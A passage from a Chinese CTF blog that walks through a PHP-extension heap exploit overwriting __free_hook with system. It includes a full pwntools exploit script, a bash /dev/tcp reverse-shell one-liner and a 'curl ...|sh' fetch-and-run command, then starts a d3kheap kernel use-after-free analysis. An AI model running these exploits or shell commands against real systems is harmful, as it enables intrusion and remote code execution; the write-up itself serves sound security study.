class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x406018</span> ◂— <span class="number">0x21</span> <span class="comment">/* name */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x406020</span> ◂— <span class="number">0x32</span> <span class="comment">/* &#x27;2&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x406028</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x406030</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x406038</span> ◂— <span class="number">0x21</span> <span class="comment">/* data */</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x406040</span> ◂— <span class="number">0x61616161616161</span> <span class="comment">/* &#x27;aaaaaaa&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x406048</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x406050</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>每一组数据（一个 object）申请 3 个 chunk，分别存放：<code>info struct</code>，<code>name</code>，<code>data</code></li>
</ul>
<p>源码中还有一个有趣的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">delete_item</span><span class="params">(__int64 info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(info + <span class="number">56</span>) )</span><br><span class="line">    *(_QWORD *)(*(_QWORD *)(info + <span class="number">56</span>) + <span class="number">48LL</span>) = *(_QWORD *)(info + <span class="number">48</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(info + <span class="number">24</span>) == <span class="number">4LL</span> )</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)info);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(info + <span class="number">32</span>) )</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(info + <span class="number">32</span>));</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个函数拥有一次覆盖的机会，如果可以控制 <code>info struct+56</code> 和 <code>info struct+48</code>，就可以实现一次 WAA</li>
<li>现在就要构建堆风水，把 <code>data</code> 弄到 <code>info struct</code> 上面，进行溢出</li>
</ul>
<p>回看 <code>parser_string</code> 的逻辑，如果数据不以 “ “ ” 开头，就调用 malloc(1)，接着就会被释放，利用这个性质就可以把 <code>data</code> 申请到 <code>info struct</code> 上面</p>
<p>接下来我们尝试覆盖 free_hook 为 system：</p>
<ul>
<li>原始的 <code>info struct</code> </li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080162891.png" alt="1657080162891"> </p>
<ul>
<li>修改后的 <code>info struct</code> </li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080977533.png" alt="1657080977533">  </p>
<ul>
<li>执行 delete_item 准备替换：</li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080322187.png" alt="1657080322187"> </p>
<ul>
<li>执行替换操作前：</li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657080359790.png" alt="1657080359790">  </p>
<ul>
<li>[rdx] 中就是 system</li>
<li>[rax + 0x30] 中就是 __free_hook</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7fa8e18</span>+<span class="number">0x30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7fa8e48</span> (__free_hook) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>替换后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7fa8e18</span>+<span class="number">0x30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7fa8e48</span> (__free_hook) —▸ <span class="number">0x7ffff7e0c290</span> (system) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7fa8e50</span> (__malloc_initialize_hook) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>执行 free 前：</li>
</ul>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657081052951.png" alt="1657081052951"> </p>
<ul>
<li>结果</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">[Attaching after process <span class="number">14488</span> vfork to child process <span class="number">14493</span>]</span><br><span class="line">[New inferior <span class="number">2</span> (process <span class="number">14493</span>)]</span><br><span class="line">[Detaching vfork parent process <span class="number">14488</span> after child exec]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">14488</span>) detached]</span><br><span class="line">process <span class="number">14493</span> is executing <span class="keyword">new</span> program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x7ffff7fc5478</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1657082871982.png" alt="1657082871982">  </p>
<ul>
<li>可以发现 PID-14493 的进程就是 /bin/sh</li>
</ul>
<p>关于远程则需要使用反弹 shell，让受害端执行以下代码就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>IP 和 PORT 是攻击端的 IP / 端口</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iouwenbo/p/11277453.html#:~:text=反弹shell（reverse,shell），就是控制端监听在某TCP%2FUDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">反弹shell原理与实现</a> </p>
<p>可以先采用 <code>system(&quot; bash -c &#39;curl xx.xx.xx.xx|sh&#39; &quot;)</code> 让受害端连接攻击端，然后再执行上述代码</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#host = &#x27;http://127.0.0.1:7777/&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;http://192.168.249.228:7777/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">package</span>(<span class="params">number</span>):</span></span><br><span class="line">    num = <span class="string">&quot;&#123;:0&gt;16x&#125;&quot;</span>.<span class="built_in">format</span>(number)</span><br><span class="line">    tmp = [num[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">    tmp2 = [<span class="string">&quot;&quot;</span>.join(tmp[i:i+<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\\u&quot;</span> + <span class="string">&quot;\\u&quot;</span>.join(tmp2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printff</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;:0&gt;16x&#125;&quot;</span>.<span class="built_in">format</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span>, value = <span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> json</span><br><span class="line">    json += <span class="string">&#x27;&quot;&#123;&#125;&quot;:&quot;&#123;&#125;&quot;,&#x27;</span>.<span class="built_in">format</span>(name, value)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">base = <span class="number">0x7ffff7dba000</span></span><br><span class="line"><span class="comment">#base = 0x7f74de914000</span></span><br><span class="line"></span><br><span class="line">system = base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">execve = base + libc.sym[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line">printf = base + libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">free_hook = base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">free_got = base + libc.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">binsh = base + <span class="number">0x00000000001b45bd</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;execve &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(execve))</span><br><span class="line">success(<span class="string">&quot;printf &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(printf))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;binsh &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">json = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;pad1&#125;\\\x00&#123;pad2&#125;&#123;fake_item&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    pad1 = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x1e</span>, </span><br><span class="line">    pad2 = <span class="string">&#x27;a&#x27;</span>* (<span class="number">0x40</span> - <span class="number">0x2e</span>), </span><br><span class="line">    <span class="comment">#fake_item = &quot;bash -c &#x27;curl xxx.xxx.xxx.xxx|sh&#x27;&quot; + package(binsh) + package(0) + package(system) + package(free_hook - 0x30)</span></span><br><span class="line">    fake_item = <span class="string">&quot;/bin/sh&quot;</span> + <span class="string">&quot;\\u0000a&quot;</span>*<span class="number">3</span> + <span class="string">&quot;a&quot;</span> *<span class="number">0x10</span> + package(binsh) + package(<span class="number">0</span>) + package(system) + package(free_hook - <span class="number">0x30</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="string">&quot;A&quot;</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>, <span class="number">2</span>)</span><br><span class="line">add(<span class="string">&quot;/bin/sh&quot;</span>, payload)</span><br><span class="line">json = <span class="string">&#x27;&#123;&#x27;</span> + json + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(host, data=&#123;<span class="string">&#x27;wishes&#x27;</span>: json&#125;)</span><br><span class="line"><span class="built_in">print</span>(json)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(json)</span><br></pre></td></tr></table></figure>
<ul>
<li>执行后会把 json 写到 exp.json 中</li>
</ul>
<p>调试用的 loader：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc loader.c -o loader -ldl -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">reader</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">&#125; _reader;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;file2ctfer/fpm/jsonparser.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">void</span> *(* Parser)(<span class="keyword">void</span> *temp);</span><br><span class="line">    _reader *reader = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span> * json = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./exp.json&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> size = read(fd, json, <span class="number">0x200</span>);</span><br><span class="line">    reader-&gt;buf = json;</span><br><span class="line">    reader-&gt;size = size;</span><br><span class="line">    reader-&gt;offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    Parser = dlsym(handle, <span class="string">&quot;Parser&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,Parser);</span><br><span class="line">    Parser(reader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这几天复现这个题目很痛苦，环境都搭了好长时间，但是也收获颇丰：</p>
<ul>
<li>PHP pwn 入门</li>
<li>PHP 扩展的搭建</li>
<li>so 文件的调试</li>
<li>docker 的使用</li>
<li>一些调试的技巧</li>
</ul>
<p>但最后还是没有打通远程，因为我的 IP 地址多占了几字节，导致 <code>bash -c &#39;curl xxx.xxx.xxx.xxx|sh&#39;</code> 这个字符串超范围了，所以后面的 <code>info struct+56</code> 和 <code>info struct+48</code> 错位，也就打不通了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/" class="post-title-link" itemprop="url">msg_msg-sk_buff的组合利用+pipe_buffer attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-30 20:59:39" itemprop="dateCreated datePublished" datetime="2022-06-30T20:59:39+08:00">2022-06-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-16 19:53:14" itemprop="dateModified" datetime="2022-09-16T19:53:14+08:00">2022-09-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>37k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>34 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>d3kheap 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  rootfs cat init                </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">chown -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict # 限制dmesg</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict # 普通用户都无法读取内核符号地址</span><br><span class="line"></span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">chmod 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod d3kheap.ko # 加载驱动</span><br><span class="line">chmod 777 /dev/d3kheap</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  d3kheap cat run.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append &quot;console=ttyS0 kaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">	-no-reboot</span><br></pre></td></tr></table></figure>
<ul>
<li>开了 kaslr</li>
<li>用了2个核心，2个线程（限制线程数量，可能有条件竞争）</li>
</ul>
<p><strong>命令定义：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3kheap_ioctl</span><span class="params">(__int64 fd, __int64 command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 caches; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fd, command);</span><br><span class="line">  raw_spin_lock(&amp;spin);                         <span class="comment">// 自旋锁</span></span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)command != <span class="number">0xDEAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)command &gt; <span class="number">0xDEAD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)command == <span class="number">0x1234</span> )            <span class="comment">// 0x1234</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_480);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        caches = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">0xCC0</span>LL, <span class="number">0x400</span>LL);</span><br><span class="line">        ++ref_count;</span><br><span class="line">        buf = caches;</span><br><span class="line">        printk(&amp;unk_37A);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)command &gt; <span class="number">0x1233</span> &amp;&amp; ((_DWORD)command == <span class="number">0x4321</span> || (_DWORD)command == <span class="number">0xBEEF</span>) )</span><br><span class="line">      printk(&amp;unk_3F0);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">      printk(&amp;unk_4F8);</span><br><span class="line">LABEL_5:</span><br><span class="line">    pv_ops[<span class="number">79</span>](&amp;spin);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !buf )                                   <span class="comment">// 0xDEAD</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_4A8);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ref_count )</span><br><span class="line">  &#123;</span><br><span class="line">    --ref_count;</span><br><span class="line">    kfree();                                    <span class="comment">// UAF</span></span><br><span class="line">    printk(&amp;unk_394);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  d3kheap_ioctl_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>定义了两个命令 <code>add</code>（0x1234） 和 <code>free</code>（0xDEAD）</li>
<li><code>add</code> 只能申请 0x400 大小的空间（从逻辑上来讲只能执行一次）</li>
<li><code>free</code> 会根据 <code>ref_count</code> 判断是否执行 kfree()，但是 <code>ref_count</code> 被初始化为“1”</li>
<li>并且有一个自旋锁</li>
</ul>
<p><strong>漏洞分析：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ref_count )</span><br><span class="line">&#123;</span><br><span class="line">  --ref_count;</span><br><span class="line">  kfree();                                    <span class="comment">// UAF</span></span><br><span class="line">  printk(&amp;unk_394);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000</span>C00 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                   ref_count dd <span class="number">1</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>本程序有 UAF，并且 ref_count 被设置为“1”</li>
<li>第一次执行 <code>add</code> 时，ref_count 会变为“2”，也就是说可以 <code>free</code> 两次</li>
</ul>
<p><strong>入侵思路：</strong></p>
<p>我的第一反应是 glibc pwn 中的 Double free，slub 中的检查和 fastbin 中的相同（会检查 freelist 指向的第一个 object），绕不过去</p>
<p>kernel pwn 中的很多利用都要依靠 <strong>结构体</strong>，比如：<code>tty_struct-&gt;tty_operations</code> 中的虚表，<code>subprocess_info</code> 的 <code>cleanup</code> 指针，但在此之前，必须先绕过 kaslr（泄露内核基地址）</p>
